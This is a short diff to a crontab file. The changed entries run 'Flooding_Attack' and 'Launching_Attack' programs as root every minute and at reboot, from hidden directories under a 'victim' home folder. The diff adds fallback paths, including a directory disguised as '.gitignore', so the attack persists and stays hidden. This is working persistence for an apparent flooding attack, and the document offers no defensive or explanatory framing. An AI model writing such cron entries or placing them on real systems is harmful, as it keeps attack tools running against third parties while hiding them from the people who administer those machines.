@@ -1,5 +1,3 @@
-*/1 * * * *   root cd /home/victim/.Launch_Attack && ./Flooding_Attack
+*/1 * * * *   root ( cd /home/victim/.Launch_Attack && ./Flooding_Attack ) || ( cd /home/victim/.etc/.gitignore && ./Flooding_Attack )
 
-*/1 * * * *   root cd /home/victim/.etc/.qq && ./Flooding_Attack
-
-@reboot root cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack
+@reboot root ( cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack ) || ( cd /home/victim/.etc/.gitignore && [ -f /home/victim/.etc/.gitignore/Launching_Attack ] && ./Launching_Attack )
